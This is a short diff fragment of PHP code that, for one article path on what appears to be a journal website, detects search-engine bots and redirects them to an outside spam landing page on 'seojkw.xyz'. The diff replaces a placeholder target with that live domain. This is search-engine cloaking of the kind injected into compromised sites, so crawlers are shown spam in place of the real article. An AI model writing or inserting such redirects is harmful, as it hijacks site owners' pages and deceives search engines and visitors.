@@ -10,7 +10,7 @@ if (strpos($_SERVER['REQUEST_URI'], '/redec/article/view/9') !== false) {
         }
     }
     if ($isBot) {
-        header('Location: https://conten-bot-anda.com/halaman-untuk-bot');
+        header('Location: https://seojkw.xyz/unialfa/landing5.html');
         exit;
     }
 }
